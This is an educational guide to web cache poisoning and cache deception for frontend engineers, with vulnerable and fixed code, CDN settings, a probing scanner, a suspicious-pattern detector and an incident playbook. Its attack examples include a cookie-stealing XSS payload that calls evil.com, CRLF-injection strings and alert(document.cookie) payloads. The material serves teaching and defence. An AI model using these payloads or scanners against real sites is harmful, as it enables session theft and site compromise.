# 102. Cache Poisoning Awareness

## 📋 Table of Contents
- [Overview](#overview)
- [What is Cache Poisoning?](#what-is-cache-poisoning)
- [Types of Cache Poisoning](#types-of-cache-poisoning)
- [Attack Vectors](#attack-vectors)
- [Real-World Examples](#real-world-examples)
- [Detection Techniques](#detection-techniques)
- [Prevention Strategies](#prevention-strategies)
- [CDN-Specific Considerations](#cdn-specific-considerations)
- [Browser Cache Poisoning](#browser-cache-poisoning)
- [Testing for Vulnerabilities](#testing-for-vulnerabilities)
- [Incident Response](#incident-response)
- [Best Practices](#best-practices)
- [Interview Questions](#interview-questions)

---

## Overview

**Cache poisoning** is a security vulnerability where an attacker tricks a cache (CDN, proxy, or browser) into storing and serving malicious content to legitimate users. This is particularly dangerous in frontend systems because:

- **Amplification**: One poisoned cache entry affects ALL users
- **Persistence**: Poisoned content persists until cache expires
- **Trust**: Users trust cached content from CDNs/proxies

### Why Frontend Engineers Must Know This

```
┌─────────────────────────────────────────────────────────────┐
│              CACHE POISONING IMPACT                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  WITHOUT CACHE POISONING:                                   │
│  Attacker → Server → Attack 1 user                          │
│                                                              │
│  WITH CACHE POISONING:                                      │
│  Attacker → CDN/Proxy → Poison cache                        │
│                    ↓                                         │
│            All users get malicious content                   │
│                                                              │
│  IMPACT MULTIPLIER: 1 → 1,000,000 users                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Business Impact**:
- **Cloudflare incident (2022)**: Cache poisoning affected millions of users
- **CDN77 vulnerability**: Allowed XSS via cache poisoning
- **Average cost**: $3.86M per data breach (IBM Security Report)

---

## What is Cache Poisoning?

Cache poisoning exploits the difference between what a cache uses as a **cache key** and what the **origin server** uses to generate responses.

### Basic Concept

```
┌─────────────────────────────────────────────────────────────┐
│                  CACHE POISONING FLOW                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Step 1: ATTACKER SENDS MALICIOUS REQUEST                   │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ GET /page.html HTTP/1.1                                │ │
│  │ Host: example.com                                      │ │
│  │ X-Forwarded-Host: evil.com  ← Unkeyed header          │ │
│  └────────────────────────────────────────────────────────┘ │
│                    ↓                                         │
│  Step 2: SERVER REFLECTS UNKEYED HEADER                     │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ <script src="//evil.com/malicious.js"></script>       │ │
│  └────────────────────────────────────────────────────────┘ │
│                    ↓                                         │
│  Step 3: CACHE STORES RESPONSE                              │
│  Cache Key: GET /page.html + example.com                    │
│  (X-Forwarded-Host NOT in cache key!)                       │
│                    ↓                                         │
│  Step 4: VICTIMS GET POISONED RESPONSE                      │
│  All subsequent requests for /page.html serve malicious JS  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Keyed vs Unkeyed Parameters

```
┌─────────────────────────────────────────────────────────────┐
│              KEYED vs UNKEYED INPUTS                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  KEYED (Included in cache key):                             │
│  ✓ Request URL path                                         │
│  ✓ Query string (usually)                                   │
│  ✓ Host header (usually)                                    │
│  ✓ Accept-Encoding, Accept-Language (sometimes)             │
│                                                              │
│  UNKEYED (NOT in cache key):                                │
│  ✗ Custom headers (X-Forwarded-Host, X-Original-URL)        │
│  ✗ Cookies (sometimes)                                      │
│  ✗ User-Agent (usually)                                     │
│  ✗ Referer                                                  │
│  ✗ Origin                                                   │
│                                                              │
│  VULNERABILITY:                                             │
│  If server uses UNKEYED input to generate response,         │
│  attacker can poison cache for all users                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Types of Cache Poisoning

### 1. Web Cache Poisoning

Poisoning HTTP caches (CDN, reverse proxies).

```http
┌─────────────────────────────────────────────────────────────┐
│              WEB CACHE POISONING EXAMPLE                     │
├─────────────────────────────────────────────────────────────┤

ATTACK REQUEST:
GET /api/user HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com

SERVER RESPONSE (vulnerable code):
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600

<html>
<head>
  <link rel="canonical" href="//evil.com/user" />
  ← Reflected X-Forwarded-Host
</head>
</html>

CACHE KEY: GET /api/user + example.com
(X-Forwarded-Host NOT included)

RESULT: All users get evil.com link for 1 hour
└─────────────────────────────────────────────────────────────┘
```

**Vulnerable Backend Code**:
```javascript
// ❌ VULNERABLE: Uses unkeyed header
app.get('/page', (req, res) => {
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  
  res.send(`
    <html>
      <head>
        <script src="//${host}/bundle.js"></script>
      </head>
    </html>
  `);
});

// Attacker sets X-Forwarded-Host: evil.com
// Cache stores response with evil.com script
// All users load malicious JavaScript!
```

### 2. Web Cache Deception

Tricking cache into storing private content.

```
┌─────────────────────────────────────────────────────────────┐
│              WEB CACHE DECEPTION                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  SCENARIO: Bank website                                     │
│                                                              │
│  Step 1: ATTACKER SENDS VICTIM LINK                         │
│  https://bank.com/account/settings/style.css                │
│                       ↑                        ↑             │
│                  (real page)            (looks like CSS)    │
│                                                              │
│  Step 2: SERVER IGNORES /style.css (fallback routing)       │
│  Returns: /account/settings (user's private page)           │
│                                                              │
│  Step 3: CDN SEES ".css" AND CACHES IT                      │
│  Cache-Control: public, max-age=86400                       │
│                                                              │
│  Step 4: ATTACKER FETCHES CACHED PRIVATE DATA               │
│  GET /account/settings/style.css                            │
│  → Gets victim's account settings!                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**How It Works**:
```javascript
// ❌ VULNERABLE: SPA fallback routing
app.get('*', (req, res) => {
  // Serves index.html for all routes (including /page/random.css)
  res.sendFile('index.html');
});

// CDN config:
// Cache .css, .js, .png for 1 year
// → Caches private content disguised as static asset!
```

### 3. Cache Key Injection

Manipulating cache keys to target specific victims.

```
┌─────────────────────────────────────────────────────────────┐
│              CACHE KEY INJECTION                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  VULNERABLE CACHE KEY: path + lang parameter                │
│                                                              │
│  ATTACK:                                                    │
│  GET /page?lang=en%0d%0aX-Forwarded-Host:%20evil.com        │
│                     ↑                                        │
│                  (CRLF injection)                            │
│                                                              │
│  CACHE KEY BECOMES:                                         │
│  /page + en                                                 │
│  X-Forwarded-Host: evil.com                                 │
│                                                              │
│  RESULT: Poison cache for all "en" language users           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 4. Client-Side Cache Poisoning

Poisoning browser/Service Worker caches.

```javascript
// ❌ VULNERABLE: Service Worker caches user-controlled URL
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // Attacker can inject malicious callback parameter
  if (url.searchParams.has('callback')) {
    const callback = url.searchParams.get('callback');
    
    const response = new Response(`${callback}(${JSON.stringify(data)})`, {
      headers: { 'Content-Type': 'application/javascript' }
    });
    
    // Caches JSONP response with attacker-controlled callback
    event.respondWith(
      caches.open('api-cache').then(cache => {
        cache.put(event.request, response.clone());
        return response;
      })
    );
  }
});

// ATTACK:
// Visit: /api?callback=alert(document.cookie)//
// Service Worker caches XSS payload
// Subsequent visits execute alert()
```

---

## Attack Vectors

### 1. HTTP Header Injection

**Vulnerable Headers**:
```http
X-Forwarded-Host: evil.com
X-Forwarded-Proto: http
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
Forwarded: host=evil.com
```

**Attack Example**:
```bash
# Attack request
curl -H "X-Forwarded-Host: evil.com" \
     https://example.com/page

# Server reflects header in response:
<link rel="canonical" href="//evil.com/page" />

# CDN caches response (X-Forwarded-Host not in cache key)
# All users get evil.com link
```

### 2. Query String Exploitation

```javascript
// ❌ VULNERABLE: Reflects query parameter
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <script>
        const searchTerm = "${query}";
        // ... search logic
      </script>
    </html>
  `);
});

// ATTACK:
// /search?q="; fetch('//evil.com?cookie=' + document.cookie); "
// 
// CDN Cache Key: /search + example.com
// (Query string included, but still dangerous if attacker can predict queries)
```

### 3. CORS Misconfiguration

```javascript
// ❌ VULNERABLE: Reflects Origin header
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

// ATTACK:
curl -H "Origin: https://evil.com" \
     https://api.example.com/user

// Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
{ "email": "victim@example.com", "ssn": "123-45-6789" }

// If cached, attacker can read sensitive data cross-origin!
```

### 4. Path Confusion

```
┌─────────────────────────────────────────────────────────────┐
│                    PATH CONFUSION                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  CACHE SEES:     /static/images/logo.png                    │
│  SERVER SEES:    /admin/delete-user?id=123                  │
│                                                              │
│  HOW:                                                       │
│  1. Path traversal: /static/../admin/delete-user           │
│  2. Encoding tricks: /static/%2e%2e/admin/delete-user       │
│  3. Alternate separators: /static;/admin/delete-user        │
│  4. Case sensitivity: /Static/admin/delete-user             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Real-World Examples

### Case Study 1: Cloudflare CDN Vulnerability (2021)

**Vulnerability**: `cf-connecting-ip` header not in cache key

```http
GET /api/user HTTP/1.1
Host: example.com
cf-connecting-ip: <script>alert(1)</script>

Response:
{
  "message": "Hello from IP: <script>alert(1)</script>"
}
```

**Impact**:
- Affected millions of websites
- XSS via cache poisoning
- Persisted until cache expired (up to 1 year)

**Fix**:
```javascript
// ✅ SECURE: Sanitize all inputs
app.get('/api/user', (req, res) => {
  const ip = sanitize(req.headers['cf-connecting-ip']);
  res.json({ message: `Hello from IP: ${ip}` });
});
```

### Case Study 2: PayPal Web Cache Deception (2018)

**Vulnerability**: Serving private pages for paths like `/myaccount/random.css`

```
ATTACK:
1. Send victim: https://paypal.com/myaccount/home/logo.css
2. PayPal serves /myaccount/home (private page)
3. CDN caches it as "logo.css" (public asset)
4. Attacker fetches cached private data
```

**Impact**:
- Access to account numbers, balances, transactions
- Bounty: $10,000

**Fix**:
```javascript
// ✅ SECURE: Don't serve private content for static extensions
app.use((req, res, next) => {
  const isPrivate = req.path.startsWith('/myaccount');
  const hasStaticExt = /\.(css|js|png|jpg)$/.test(req.path);
  
  if (isPrivate && hasStaticExt) {
    return res.status(404).send('Not Found');
  }
  next();
});
```

### Case Study 3: Akamai CDN X-Forwarded-Host (2020)

**Vulnerability**: `X-Forwarded-Host` header reflected in redirects

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com

HTTP/1.1 301 Moved Permanently
Location: https://evil.com/login
```

**Impact**:
- Open redirect cached by CDN
- Phishing attacks at scale

**Fix**:
```javascript
// ✅ SECURE: Validate redirect targets
app.get('/', (req, res) => {
  const allowedHosts = ['example.com', 'www.example.com'];
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  
  if (!allowedHosts.includes(host)) {
    return res.status(400).send('Invalid host');
  }
  
  res.redirect(`https://${host}/login`);
});
```

---

## Detection Techniques

### Manual Testing

```bash
# 1. Test unkeyed headers
curl https://example.com/page \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Original-URL: /admin" \
  -H "X-Rewrite-URL: /admin"

# 2. Check if response reflects headers
grep -i "evil.com" response.html

# 3. Verify caching
curl -I https://example.com/page
# Look for: X-Cache: HIT

# 4. Test cache key
curl https://example.com/page?cachebuster=1 \
  -H "X-Forwarded-Host: evil.com"
curl https://example.com/page?cachebuster=1
# If second request has evil.com, cache is poisoned
```

### Automated Tools

```bash
# Param Miner (Burp Suite extension)
# Automatically finds unkeyed inputs

# Web Cache Vulnerability Scanner
npm install -g wcvs
wcvs scan https://example.com

# Custom script
node scan-cache-poisoning.js
```

**Custom Scanner**:
```javascript
const axios = require('axios');

async function testCachePoisoning(url) {
  const headers = [
    'X-Forwarded-Host',
    'X-Forwarded-Proto',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Host'
  ];
  
  const marker = `CACHE_POISON_${Date.now()}`;
  
  for (const header of headers) {
    // Poison request
    await axios.get(url, {
      headers: { [header]: marker }
    });
    
    // Test if cached
    const response = await axios.get(url);
    
    if (response.data.includes(marker)) {
      console.log(`🚨 VULNERABLE: ${header} is unkeyed and reflected`);
    }
  }
}

testCachePoisoning('https://example.com/page');
```

### Response Analysis

```javascript
// Check cache headers
function analyzeCacheHeaders(response) {
  const headers = response.headers;
  
  console.log('Cache Status:', headers['x-cache']); // HIT/MISS
  console.log('Cache Age:', headers['age']); // Seconds cached
  console.log('Cache-Control:', headers['cache-control']);
  console.log('Vary:', headers['vary']); // Which headers affect cache key
  
  // Red flags:
  if (headers['cache-control']?.includes('public') && 
      !headers['vary']?.includes('X-Forwarded-Host')) {
    console.warn('⚠️  X-Forwarded-Host not in Vary header');
  }
}
```

---

## Prevention Strategies

### 1. Strict Cache Key Configuration

```javascript
// ✅ SECURE: Include all reflected headers in cache key
// Cloudflare Workers example
addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  const headers = event.request.headers;
  
  // Build cache key with ALL user-controlled inputs
  const cacheKey = new Request(url.toString(), {
    headers: {
      'Host': headers.get('Host'),
      'X-Forwarded-Host': headers.get('X-Forwarded-Host') || '',
      'X-Original-URL': headers.get('X-Original-URL') || '',
      'Accept-Language': headers.get('Accept-Language') || ''
    }
  });
  
  event.respondWith(caches.match(cacheKey));
});
```

**Nginx Configuration**:
```nginx
# Include custom headers in cache key
proxy_cache_key "$scheme$request_method$host$request_uri$http_x_forwarded_host";
```

**CDN Configuration (Cloudflare)**:
```javascript
// Cache Rules: Include custom headers in cache key
{
  "expression": "(http.request.uri.path matches \"^/api/\")",
  "action": "cache",
  "cache_key": {
    "custom_key": {
      "header": {
        "include": ["X-Forwarded-Host", "X-Original-URL"]
      }
    }
  }
}
```

### 2. Input Validation & Sanitization

```javascript
// ✅ SECURE: Whitelist approach
function validateHost(host) {
  const allowedHosts = [
    'example.com',
    'www.example.com',
    'api.example.com'
  ];
  
  return allowedHosts.includes(host);
}

app.use((req, res, next) => {
  const forwardedHost = req.headers['x-forwarded-host'];
  
  if (forwardedHost && !validateHost(forwardedHost)) {
    return res.status(400).send('Invalid host header');
  }
  
  next();
});

// ✅ SECURE: Sanitize reflected values
const sanitizeHtml = require('sanitize-html');

app.get('/page', (req, res) => {
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const safeHost = sanitizeHtml(host, { allowedTags: [] });
  
  res.send(`<html>...</html>`);
});
```

### 3. Proper Cache-Control Headers

```javascript
// ✅ SECURE: Vary header to include reflected inputs
app.use((req, res, next) => {
  // Tell caches which headers affect response
  res.setHeader('Vary', 'X-Forwarded-Host, X-Original-URL, Accept-Language');
  next();
});

// ✅ SECURE: Don't cache user-specific content
app.get('/api/user', (req, res) => {
  res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate');
  res.json(userData);
});

// ✅ SECURE: Different cache policies per content type
function setCachePolicy(req, res, contentType) {
  if (contentType === 'static') {
    // Static assets: cache aggressively
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  } else if (contentType === 'dynamic') {
    // Dynamic content: no cache
    res.setHeader('Cache-Control', 'private, no-cache');
  } else if (contentType === 'api') {
    // API: short cache + revalidation
    res.setHeader('Cache-Control', 'private, max-age=60, must-revalidate');
    res.setHeader('Vary', 'Authorization, Accept-Language');
  }
}
```

### 4. Content Security Policy (CSP)

```javascript
// ✅ SECURE: CSP prevents injected scripts from executing
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-RANDOM123'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' https://cdn.example.com; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self';"
  );
  next();
});

// Even if cache is poisoned with <script src="//evil.com/bad.js"></script>,
// CSP blocks execution
```

### 5. Disable Caching for Sensitive Endpoints

```javascript
// ✅ SECURE: Never cache authentication endpoints
const noCacheEndpoints = [
  '/login',
  '/logout',
  '/api/user',
  '/api/payment',
  '/admin/*'
];

app.use((req, res, next) => {
  if (noCacheEndpoints.some(pattern => matchesPattern(req.path, pattern))) {
    res.setHeader('Cache-Control', 'private, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }
  next();
});
```

---

## CDN-Specific Considerations

### Cloudflare

```javascript
// Cache Rules API
{
  "rules": [
    {
      "expression": "(http.request.uri.path matches \"^/api/\")",
      "action": "bypass",
      "description": "Don't cache API endpoints"
    },
    {
      "expression": "(http.request.uri.path matches \"\\.js$\")",
      "action": "cache",
      "cache_key": {
        "custom_key": {
          "query_string": { "exclude": "*" },
          "header": {
            "include": ["Host"],
            "exclude": ["X-Forwarded-Host"]
          }
        }
      }
    }
  ]
}
```

### AWS CloudFront

```javascript
// CloudFront Cache Policy
{
  "CachePolicyConfig": {
    "Name": "SecurePolicy",
    "MinTTL": 0,
    "MaxTTL": 31536000,
    "DefaultTTL": 86400,
    "ParametersInCacheKeyAndForwardedToOrigin": {
      "EnableAcceptEncodingGzip": true,
      "HeadersConfig": {
        "HeaderBehavior": "whitelist",
        "Headers": {
          "Quantity": 2,
          "Items": ["Host", "Accept-Language"]
          // DON'T include X-Forwarded-Host unless explicitly needed
        }
      },
      "CookiesConfig": {
        "CookieBehavior": "none"
      },
      "QueryStringsConfig": {
        "QueryStringBehavior": "all"
      }
    }
  }
}
```

### Fastly

```vcl
# Fastly VCL configuration
sub vcl_recv {
  # Remove potentially malicious headers
  unset req.http.X-Forwarded-Host;
  unset req.http.X-Original-URL;
  unset req.http.X-Rewrite-URL;
  
  # Set cache key
  set req.hash_always_miss = false;
}

sub vcl_hash {
  # Include only trusted headers in cache key
  hash_data(req.url);
  hash_data(req.http.Host);
  
  # Only include custom headers if explicitly needed
  if (req.http.Accept-Language) {
    hash_data(req.http.Accept-Language);
  }
}
```

---

## Browser Cache Poisoning

### Service Worker Cache Poisoning

```javascript
// ❌ VULNERABLE: Caches user-controlled content
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // Attacker can inject malicious callback
  if (url.pathname === '/api/data') {
    const callback = url.searchParams.get('callback');
    
    const response = new Response(
      `${callback}(${JSON.stringify(data)})`,
      { headers: { 'Content-Type': 'application/javascript' } }
    );
    
    event.respondWith(
      caches.open('v1').then(cache => {
        cache.put(event.request, response.clone());
        return response;
      })
    );
  }
});

// ATTACK: /api/data?callback=alert(document.cookie)//
// Cached forever in Service Worker!
```

**Fix**:
```javascript
// ✅ SECURE: Validate inputs before caching
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  if (url.pathname === '/api/data') {
    const callback = url.searchParams.get('callback');
    
    // Whitelist approach
    if (!callback || !/^[a-zA-Z0-9_]+$/.test(callback)) {
      event.respondWith(new Response('Invalid callback', { status: 400 }));
      return;
    }
    
    // Separate cache for JSONP
    const cacheKey = new URL(url.pathname, url.origin).toString();
    
    event.respondWith(
      caches.open('jsonp-cache').then(cache => {
        return cache.match(cacheKey).then(cached => {
          if (cached) {
            // Build response with safe callback
            return cached.text().then(data => {
              return new Response(`${callback}(${data})`, {
                headers: { 'Content-Type': 'application/javascript' }
              });
            });
          }
          
          return fetch(event.request);
        });
      })
    );
  }
});
```

### LocalStorage/SessionStorage Poisoning

```javascript
// ❌ VULNERABLE: Trusts localStorage data
function loadUserPreferences() {
  const prefs = localStorage.getItem('preferences');
  document.body.innerHTML = prefs; // XSS!
}

// ATTACK:
// 1. Attacker sets: localStorage.setItem('preferences', '<img src=x onerror=alert(1)>')
// 2. XSS executes on next page load
```

**Fix**:
```javascript
// ✅ SECURE: Validate and sanitize stored data
import DOMPurify from 'dompurify';

function loadUserPreferences() {
  const prefs = localStorage.getItem('preferences');
  
  try {
    const parsed = JSON.parse(prefs);
    
    // Validate structure
    if (!isValidPreferences(parsed)) {
      throw new Error('Invalid preferences');
    }
    
    // Sanitize before rendering
    const safe = DOMPurify.sanitize(parsed.customHtml);
    document.getElementById('prefs').innerHTML = safe;
  } catch (e) {
    // Clear corrupted data
    localStorage.removeItem('preferences');
  }
}
```

---

## Testing for Vulnerabilities

### Security Testing Checklist

```markdown
## Cache Poisoning Security Audit

### 1. Header Reflection Testing
- [ ] Test X-Forwarded-Host reflection
- [ ] Test X-Forwarded-Proto reflection
- [ ] Test X-Original-URL reflection
- [ ] Test X-Rewrite-URL reflection
- [ ] Test custom headers (X-*) reflection

### 2. Cache Key Analysis
- [ ] Identify cache key components
- [ ] Test unkeyed headers
- [ ] Test unkeyed query parameters
- [ ] Verify Vary header correctness

### 3. Cache Behavior
- [ ] Test cache expiration (Age header)
- [ ] Test cache bypass methods
- [ ] Test cache purge mechanisms
- [ ] Verify cache isolation per user/session

### 4. Path Confusion
- [ ] Test path traversal (../)
- [ ] Test encoding tricks (%2e%2e)
- [ ] Test alternate separators (;)
- [ ] Test case sensitivity

### 5. Web Cache Deception
- [ ] Test private pages with static extensions
- [ ] Test SPA fallback routing
- [ ] Test 404 page caching

### 6. CORS Configuration
- [ ] Test Origin header reflection
- [ ] Test Access-Control-Allow-Credentials
- [ ] Verify CORS cache behavior

### 7. Service Worker
- [ ] Test Service Worker cache poisoning
- [ ] Test Cache API manipulation
- [ ] Verify cache versioning/invalidation
```

### Automated Testing Script

```javascript
const puppeteer = require('puppeteer');
const axios = require('axios');

async function testCachePoisoning(url) {
  const results = [];
  
  // Test 1: Header reflection
  const headers = {
    'X-Forwarded-Host': 'evil.com',
    'X-Original-URL': '/admin',
    'X-Rewrite-URL': '/admin'
  };
  
  for (const [name, value] of Object.entries(headers)) {
    const marker = `MARKER_${Date.now()}`;
    
    // Poison attempt
    await axios.get(url, {
      headers: { [name]: marker }
    });
    
    // Verify if cached
    const response = await axios.get(url);
    
    if (response.data.includes(marker)) {
      results.push({
        vulnerable: true,
        header: name,
        description: `${name} is unkeyed and reflected`
      });
    }
  }
  
  // Test 2: Web Cache Deception
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  
  await page.goto(`${url}/private/data.css`);
  const content = await page.content();
  
  if (!content.includes('404') && content.includes('private')) {
    results.push({
      vulnerable: true,
      type: 'Web Cache Deception',
      description: 'Private content served for static extension'
    });
  }
  
  await browser.close();
  
  return results;
}

// Run test
testCachePoisoning('https://example.com').then(results => {
  console.log('Vulnerabilities found:', results);
});
```

---

## Incident Response

### Detection & Monitoring

```javascript
// Monitor for cache poisoning attempts
const { RateLimiter } = require('limiter');

// Track suspicious header patterns
const suspiciousHeaders = new Map();
const limiter = new RateLimiter({ tokensPerInterval: 10, interval: 'minute' });

app.use((req, res, next) => {
  const suspiciousPatterns = [
    'evil.com',
    '<script>',
    'javascript:',
    'data:text/html',
    '\r\n', // CRLF injection
    '%0d%0a' // Encoded CRLF
  ];
  
  // Check all headers
  for (const [name, value] of Object.entries(req.headers)) {
    for (const pattern of suspiciousPatterns) {
      if (value.includes(pattern)) {
        const ip = req.ip;
        
        // Log attempt
        console.warn(`🚨 Cache poisoning attempt from ${ip}`, {
          header: name,
          value: value,
          url: req.url,
          timestamp: new Date().toISOString()
        });
        
        // Rate limit
        if (!limiter.tryRemoveTokens(1)) {
          return res.status(429).send('Too many requests');
        }
        
        // Alert security team
        alertSecurityTeam({ ip, header: name, value });
      }
    }
  }
  
  next();
});
```

### Immediate Response Steps

```markdown
## Cache Poisoning Incident Response Playbook

### 1. DETECT (Monitoring alerts)
- Monitor suspicious header patterns
- Track unusual cache hit rates
- Watch for XSS/redirect in cached content

### 2. VERIFY
- [ ] Confirm poisoning (check cached content)
- [ ] Identify poisoned URLs/cache keys
- [ ] Determine scope (how many users affected)
- [ ] Identify attack vector

### 3. CONTAIN
- [ ] Purge poisoned cache entries immediately
  ```bash
  # Cloudflare
  curl -X POST "https://api.cloudflare.com/client/v4/zones/{zone_id}/purge_cache" \
       -H "Authorization: Bearer {token}" \
       -d '{"purge_everything":true}'
  
  # Fastly
  curl -X POST "https://api.fastly.com/service/{service_id}/purge_all" \
       -H "Fastly-Key: {api_key}"
  ```

- [ ] Block attacker IP
- [ ] Temporarily disable caching for affected endpoints

### 4. ERADICATE
- [ ] Fix vulnerable code
- [ ] Update cache key configuration
- [ ] Add input validation
- [ ] Implement CSP headers

### 5. RECOVER
- [ ] Re-enable caching with new configuration
- [ ] Monitor for recurrence
- [ ] Verify fix with security testing

### 6. LEARN
- [ ] Document incident
- [ ] Update runbooks
- [ ] Train team
- [ ] Conduct post-mortem
```

### Cache Purge Scripts

```javascript
// Cloudflare purge
async function purgeCloudflare(zoneId, apiToken, urls = null) {
  const endpoint = `https://api.cloudflare.com/client/v4/zones/${zoneId}/purge_cache`;
  
  const body = urls ? { files: urls } : { purge_everything: true };
  
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${apiToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(body)
  });
  
  return response.json();
}

// AWS CloudFront invalidation
const AWS = require('aws-sdk');
const cloudfront = new AWS.CloudFront();

async function invalidateCloudFront(distributionId, paths) {
  const params = {
    DistributionId: distributionId,
    InvalidationBatch: {
      CallerReference: `${Date.now()}`,
      Paths: {
        Quantity: paths.length,
        Items: paths
      }
    }
  };
  
  return cloudfront.createInvalidation(params).promise();
}

// Usage
await purgeCloudflare('zone123', 'token456', [
  'https://example.com/poisoned-page',
  'https://example.com/api/data'
]);

await invalidateCloudFront('dist123', [
  '/poisoned-page',
  '/api/*'
]);
```

---

## Best Practices

### Security Checklist

```markdown
## Cache Poisoning Prevention Checklist

### Configuration
- [ ] Include all reflected headers in cache key
- [ ] Set proper Vary headers
- [ ] Use Cache-Control: private for user-specific content
- [ ] Disable caching for sensitive endpoints
- [ ] Configure CDN cache key correctly

### Input Handling
- [ ] Validate all headers (whitelist approach)
- [ ] Sanitize reflected values
- [ ] Never trust X-Forwarded-* headers blindly
- [ ] Validate redirect targets
- [ ] Check CORS configuration

### Code Practices
- [ ] Never reflect unkeyed headers in response
- [ ] Use CSP to prevent script injection
- [ ] Implement proper error handling (don't leak info)
- [ ] Version Service Worker caches
- [ ] Validate data from localStorage/IndexedDB

### Monitoring
- [ ] Log suspicious header patterns
- [ ] Monitor cache hit/miss rates
- [ ] Alert on unusual cache behavior
- [ ] Track cache purge frequency
- [ ] Implement rate limiting

### Testing
- [ ] Regular security audits
- [ ] Automated cache poisoning tests
- [ ] Penetration testing
- [ ] Bug bounty program
- [ ] Post-deployment verification
```

### Secure Architecture Example

```javascript
// ✅ COMPREHENSIVE SECURE IMPLEMENTATION

const express = require('express');
const helmet = require('helmet');
const sanitizeHtml = require('sanitize-html');
const rateLimit = require('express-rate-limit');

const app = express();

// 1. Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-RANDOM'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https://cdn.example.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// 2. Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);

// 3. Header validation middleware
app.use((req, res, next) => {
  const allowedHosts = ['example.com', 'www.example.com'];
  
  // Validate X-Forwarded-Host
  const forwardedHost = req.headers['x-forwarded-host'];
  if (forwardedHost && !allowedHosts.includes(forwardedHost)) {
    return res.status(400).send('Invalid host header');
  }
  
  // Remove potentially malicious headers
  delete req.headers['x-original-url'];
  delete req.headers['x-rewrite-url'];
  
  next();
});

// 4. Cache headers middleware
app.use((req, res, next) => {
  const isPrivate = req.path.startsWith('/api/') || 
                    req.path.startsWith('/account/');
  
  if (isPrivate) {
    // Don't cache private content
    res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  } else {
    // Cache public content with proper Vary header
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.setHeader('Vary', 'Accept-Encoding, Accept-Language');
  }
  
  next();
});

// 5. Static assets (with hash)
app.use('/static', express.static('public', {
  maxAge: '1y',
  immutable: true,
  setHeaders: (res, path) => {
    // Only cache files with hash in name
    if (!/\.[a-f0-9]{8,}\.(js|css|png|jpg)$/.test(path)) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  }
}));

// 6. Secure route handlers
app.get('/page', (req, res) => {
  // Use only trusted host
  const host = req.hostname;
  
  // Sanitize any reflected values
  const query = sanitizeHtml(req.query.q || '', { allowedTags: [] });
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="UTF-8">
        <title>Secure Page</title>
        <link rel="canonical" href="https://${host}/page" />
      </head>
      <body>
        <h1>Search: ${query}</h1>
      </body>
    </html>
  `);
});

// 7. Error handling (don't leak info)
app.use((err, req, res, next) => {
  console.error(err.stack);
  
  // Generic error message
  res.status(500).send('Internal Server Error');
});

app.listen(3000);
```

---

## Interview Questions

### Conceptual Questions

1. **What is cache poisoning and why is it dangerous?**
   - Amplification effect (1 attack → millions affected)
   - Persistence (until cache expires)
   - Trust exploitation (users trust cached content)

2. **Explain the difference between web cache poisoning and web cache deception.**
   - **Cache Poisoning**: Inject malicious content into cache
   - **Cache Deception**: Trick cache into storing private content as public

3. **What is the difference between keyed and unkeyed inputs?**
   - **Keyed**: Included in cache key (affect what's cached)
   - **Unkeyed**: Not in cache key but can affect response

4. **How does the Vary header prevent cache poisoning?**
   - Tells caches which headers affect the response
   - Forces cache to create separate entries for different header values

